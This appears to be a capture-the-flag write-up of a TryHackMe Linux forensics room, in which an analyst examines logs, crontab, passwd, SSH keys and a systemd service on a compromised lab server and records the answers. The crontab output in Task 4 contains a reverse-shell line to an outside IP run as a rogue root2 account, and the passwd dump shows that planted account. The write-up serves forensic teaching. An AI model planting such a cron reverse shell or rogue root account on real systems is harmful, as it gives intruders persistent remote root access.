# Linux-Forensics

#### Learn about digital forensics artefacts found on Linux servers by analysing a compromised server

### Task 1 Deploy the first VM

<p>
You have been hired to investigate a data breach at ACME web design. Log in to the target machine using SSH with the following credentials:
</p>

1. MACHINE_IP:
2. Username - 'fred'
3. Password - 'FredRules!'

```
Q1 Deploy the machine and log in to the VM using the provided credentials.
Ans: No Anwer Needed.
```

### Task 2 Apache Log Analysis I

<p>The most significant attack surface on the server is probably the web service; fortunately, the Apache access log keeps a history of all of the requests sent to the</p>

1. Source address
2. response code and length
3. user-agent

<p>Every request from a modern browser should contain a user-agent string that can be used to identify it roughly. The content of the user-agent string is then used to modify the experience by displaying the mobile version of a site or disabling features not supported on older browsers.
</p>

<p>
We can also use this string to identify traffic from potentially malicious tools as scanning tools like Nmap, SQLmap, DirBuster and Nikto leak their identity's through default user-agent strings.
</p>

<p>We got following access.log</p>
[access log file](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/assets/Linux-Forensics/access.log)

```
fred@acmeweb:/var/log/apache2$ ls -ls
total 1348
1344 -rw-r----- 1 root adm 1369411 Apr 20 10:13 access.log
   4 -rw-r----- 1 root adm    3457 Aug  9 17:05 error.log
   0 -rw-r----- 1 root adm       0 Apr 20 09:12 other_vhosts_access.log
fred@acmeweb:/var/log/apache2$ ls -lh
total 1.4M
-rw-r----- 1 root adm 1.4M Apr 20 10:13 access.log
-rw-r----- 1 root adm 3.4K Aug  9 17:05 error.log
-rw-r----- 1 root adm    0 Apr 20 09:12 other_vhosts_access.log
fred@acmeweb:/var/log/apache2$ which python
fred@acmeweb:/var/log/apache2$ which python3
/usr/bin/python3
fred@acmeweb:/var/log/apache2$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.9.3.182 - - [09/Aug/2021 17:20:52] "GET / HTTP/1.1" 200 -
10.9.3.182 - - [09/Aug/2021 17:20:55] code 404, message File not found
10.9.3.182 - - [09/Aug/2021 17:20:55] "GET /favicon.ico HTTP/1.1" 404 -
10.9.3.182 - - [09/Aug/2021 17:21:03] "GET /access.log HTTP/1.1" 200 -
10.9.3.182 - - [09/Aug/2021 17:22:03] "GET /error.log HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
fred@acmeweb:/var/log/apache2$
```

```
1. Navigate to /var/log/
Ans: No Anwer Needed.

2. How many different tools made requests to the server?
Ans: 2

3. Name a path requested by Nmap.
Ans: /nmaplowercheck1618912425

```

### Task 3 Web Server Analysis

<p>
Web scanners are run against servers pretty much all the time, so this traffic is not out of the ordinary. 
Have a look around the site for potential attack vectors. 
</p>

<p>By Checking Logs found below answers</p>

```
192.168.56.24 - - [20/Apr/2021:09:57:40 +0000] "POST /contact.php HTTP/1.1" 200 1018 "http://192.168.56.9/contact.php" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

```
1. What page allows users to upload files?
Ans: contact.php

2. What IP uploaded files to the server?
Ans: 192.168.56.24

3. Who left an exposed security notice on the server?
Ans: Fred

```

### Task 4 Persistence Mechanisms I

<p>It looks like our attacker got in via Remote File Inclusion (RFI). It's best to look around the system itself now for any evidence of persistence mechanisms that could lead to a payload.  There are multiple ways to maintain persistence in most Linux distributions including but not limited to:<p>

1. cron
2. Services/systemd
3. bashrc
4. Kernel modules
5. SSH keys

```
fred@acmeweb:~$ crontab -l
no crontab for fred
fred@acmeweb:~$ sudo -l
[sudo] password for fred:
Matching Defaults entries for fred on acmeweb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on acmeweb:
    (ALL : ALL) ALL
fred@acmeweb:~$ sudo su
root@acmeweb:/home/fred# crontab -l
no crontab for root
root@acmeweb:/home/fred# less /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*  *    * * *   root2   sh -i >& /dev/tcp/192.168.56.206/1234 0>&1
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
/etc/crontab (END)

```

```
1. What command and option did the attacker use to establish a backdoor?
Ans: sh -i

```

### Task 5 User Accounts

<p>It looks like the command from the previous task was set up to run under the root2 account. This account doesn't make any sense as there should only be one root account. Wonder how it got there?
</p>

<p>
There are a couple of locations where account information is stored on Linux distributions, including:
</p>

1. /etc/passwd - contains the names of most of the accounts on the system. Should have open read permissions and should not contain password hashes.
2. /etc/shadow - contains names but should also contain password hashes. Should have strict permissions.

```
fred@acmeweb:~$ clear
fred@acmeweb:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
fred:x:1000:1000:fred:/home/fred:/bin/bash
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash
fred@acmeweb:~$
```

![Passwords](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Linux-Forensics/Picture-1.png "Passwords")

```
1. What is the password of the second root account?
Ans: mrcake

```

### Task 6 Deploy the second VM

<p>Wow, it looks like they got hacked again! Better have another look; the credentials are the same as last time:</p>

1. MACHINE_IP
2. 'fred'
3. 'FredRules!'

```
1. Deploy the second machine and log in to the VM using the provided credentials.
Ans: No Answers Needed.
```

### Task 7 Apache Log Analysis II

<p>We got following access.log</p>
[access log file](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/assets/Linux-Forensics/access-1.log)

<br/>

<p>The log file is a lot smaller this time around, so it looks like our attacker was a little more subtle. There also don't appear to be obvious user agents anymore. Fortunately, there are a few other ways of identifying traffic originating from scanners. The time between each request is a good metric for most tools. You can also identify individual tools from signatures left in the requests; for example, Nmap will send HTTP requests with a random non-standard method when performing certain enumeration tasks. More aggressive tools can also be identified simply from the number of requests sent during any given attack; directory brute-forcing tools are a perfect example of this and are likely to fall foul of banning systems like fail2ban.</p>

<p>A poorly designed site may also freely grant valuable information without the need for aggressive tools. In this case, the site uses sequential IDs for all of the products making. It easily scrapes every single product or finds the total size of the product database by simply increasing the product ID until a 404 error occurs.
</p>

```
1. Name one of the non-standard HTTP Requests.
Ans: GXWR

2. At what time was the Nmap scan performed? (format: HH:MM:SS)
Ans: 13:30:15

```

### Task 8 Persistence Mechanisms II

<p>The adversary has been a little smarter this time around. If any backdoor exists, it's likely to be more subtle. SSH-keys are another excellent way of maintaining access, so it might be worth looking for additions to the authorized_keys file.</p>

```
fred@acmeweb:/var/log/apache2$ sudo su
[sudo] password for fred:
root@acmeweb:/var/log/apache2# cd ~
root@acmeweb:~# ls -la
total 36
drwx------  6 root root 4096 Apr 20 13:40 .
drwxr-xr-x 24 root root 4096 Apr 20 08:51 ..
-rw-------  1 root root   22 Apr 20 13:40 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Apr 20 13:39 .cache
drwx------  3 root root 4096 Apr 20 13:36 .gnupg
drwxr-xr-x  3 root root 4096 Apr 20 13:40 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Apr 20 08:58 .ssh
root@acmeweb:~# cat .ssh
cat: .ssh: Is a directory
root@acmeweb:~# cd .ssh
root@acmeweb:~/.ssh# ls -la
total 12
drwx------ 2 root root 4096 Apr 20 08:58 .
drwx------ 6 root root 4096 Apr 20 13:40 ..
-rw------- 1 root root  563 Apr 20 13:39 authorized_keys
root@acmeweb:~/.ssh# cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDYCKt0bYP2YIwMWdJWqF3lr3Drs3sS9hiybsxz9W6dG6d15mg0SVMSe5H+rPM6VmzOKJaVpDjT1Ll5eR6YcbefTF2bMXHveyvcrzDxyZeWdgBs5u8/4DZxEN6fq6IZRRftmrMgMzSnpmdCm8kvacgq3lIjLx/sKAlX9GqPIz09t0Rk5MB7zk3lg1wdTZxZwwCHPbZW7mGlVcxNBB9wdbAmcvezscoF0i7v0tY8iCoFlrBysOMBMrEJji2UONtI/wrt7AvoK+gshiG7VTjZ2oQBacnyHRToXHxOZiSIbCQrJ6rCxa32QOGQNmAVIucqYjRbJedz0NbGq7M9B+hBmG/mdtsoGOXQKyzoUlAbulRXjSVtManiUyq9im1HBHfuduiBrbfcOKz24NMT7RaIsPsZCUCpfHaT7S5XplQypAjkxABds8jod/TXcTYibdWE9scrUUidgCsPELQlKEfhhZ8+cyjbMCGNB5LOgieJSVk6D1JC97TaFNi4X9/9i2UA+L0= kali@kali
root@acmeweb:~/.ssh#
```

```
1. What username and hostname combination can be found in one of the authorized_keys files? (format: username@hostname)
Ans : kali@kali

```

### Task 9 Program Execution History

<p>Of course, adding a public key to root's authorized_keys requires root-level privileges so, it may be best to look for more evidence of privilege escalation. In general, Linux stores a tiny amount of programme execution history when compared to Windows but, there are still a few valuable sources, including:
</p>

1. bash_history - Contains a history of commands run in bash; this file is well known, easy to edit and sometimes disabled by default.
2. auth.log - Contains a history of all commands run using sudo.
3. history.log (apt) - Contains a history of all tasks performed using apt - is useful for tracking programme installation and removal.

<p>systemd services also keep logs in the journald system; these logs are kept in a binary format and have to be read by a utility like journalctl. This binary format comes with some advantages; however, each journal is capable of validating itself and is harder to modify.</p>

```
root@acmeweb:~# ls -la
total 36
drwx------  6 root root 4096 Apr 20 13:40 .
drwxr-xr-x 24 root root 4096 Apr 20 08:51 ..
-rw-------  1 root root   22 Apr 20 13:40 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Apr 20 13:39 .cache
drwx------  3 root root 4096 Apr 20 13:36 .gnupg
drwxr-xr-x  3 root root 4096 Apr 20 13:40 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Apr 20 08:58 .ssh
root@acmeweb:~# cat .bash_history
nano /etc/passwd
exit
root@acmeweb:~#
```

```
1. What is the first command present in root's bash_history file?
Ans: nano /etc/passwd

```

### Task 10 Deploy The Final VM

<p>This is getting a little annoying now. The credentials are still the same:</p>

1. MACHINE_IP
2. 'fred'
3. 'FredRules!'

```
1. Deploy the final machine and log in to the VM using the provided credentials.
Ans: no anwer needed.

```

### Task 11 Persistence Mechanisms III

<p>Malware can also maintain persistence using systemd as scripts run under systemd can run in the background and restart whenever the system is booted or whenever the script crashes. It is also relatively easy to conceal malicious scripts as they can blend in with other services. systemd services are defined in .service files which can contain:</p>

1.  The command that runs whenever the service starts
2.  The user the service runs as
3.  An optional description

<p>In this case, the malware is pretty obvious as it seems to be printing errors to the screen so, there is no way that it is dormant. Running systemctl will list all of the services loaded into the system. And much like Windows, there's usually a lot of them. It might be worth adding --type=service --state=active to the command as it will reduce the list to services that are running. Once the name of a suspicious service is found, more information can then be extracted by running systemctl status <service name> </p>

```
red@acmeweb:~$ systemctl status IpManager.service
● IpManager.service
Loaded: loaded (/var/lib/network/IpManager.service; enabled; vendor preset: enabled)
Active: active (running) since Wed 2021–06–02 13:44:20 UTC; 26s ago
Main PID: 1462 (bash)
Tasks: 2 (limit: 499)
CGroup: /system.slice/IpManager.service
├─1462 /bin/bash /etc/network/ZGtsam5hZG1ua2Fu.sh
└─1485 sleep 10

fred@acmeweb:~$ cat /etc/network/ZGtsam5hZG1ua2Fu.sh
##[gh0st_1n_the_machine]
##

```

```
1. Figure out what's going on and find the flag.
Ans: [gh0st_1n_the_machine]

```
